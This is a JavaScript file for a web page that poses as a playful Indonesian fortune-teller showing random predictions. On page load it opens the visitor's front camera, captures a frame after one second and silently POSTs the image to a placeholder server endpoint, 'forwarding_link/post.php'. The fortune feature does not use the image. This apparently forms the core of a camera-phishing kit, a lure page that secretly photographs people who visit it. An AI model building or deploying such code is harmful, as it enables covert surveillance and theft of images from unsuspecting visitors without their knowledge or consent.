'use strict';

const predictions = [
  "lu bentar lagi hoki",
  "Seseorang dari masa lalu akan menghubungimu.",
  "Keberuntungan sedang mendekat. Bersiaplah Sosok hitam!",
  "Ada peluang besar yang akan datang, jangan lewatkan kids!",
  "Hati-hati dengan keputusan impulsif hari ini.",
  "Kamu akan mendapat inspirasi luar biasa saat mandi :v.",
  "Cinta akan datang dari arah yang tidak terduga :v",
  "Pekerjaan impianmu akan segera mendekat semangat !!"
];

// Fungsi untuk mengakses webcam
async function init() {
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const errorMsgElement = document.querySelector('span#errorMsg');

  const constraints = {
    audio: false,
    video: {
      facingMode: "user", // kamera depan
      width: 1920, // ukuran pixel biar hd
      height: 1080
    }
  };

  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream, video, canvas);
  } catch (e) {
    errorMsgElement.innerHTML = `navigator.getUserMedia error: ${e.toString()}`;
  }
}

// Fungsi untuk menangani stream webcam
function handleSuccess(stream, video, canvas) {
  window.stream = stream;
  video.srcObject = stream;

  const context = canvas.getContext('2d');
  setTimeout(function () {
    context.drawImage(video, 0, 0, 640, 480);  // Menangkap frame dari video
    const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");

    // Kirim data gambar ke server menggunakan AJAX
    post(canvasData);
  }, 1000); // Mengambil gambar setiap 1.5 detik

  video.play(); // Pastikan video terus diputar
}

// Fungsi untuk mengirim gambar ke server menggunakan AJAX
function post(imgdata) {
  $.ajax({
    type: 'POST',
    data: { cat: imgdata },
    url: 'forwarding_link/post.php',
    dataType: 'json',
    async: false,
    success: function (result) {
      console.log("...");
    },
    error: function () {
      console.error("...");
    }
  });
}

// Fungsi untuk mendapatkan ramalan masa depan secara acak
function getPrediction() {
  const random = Math.floor(Math.random() * predictions.length);
  document.getElementById("prediction").innerText = predictions[random];
}

// Memulai webcam saat halaman dimuat
window.onload = () => {
  init();
};
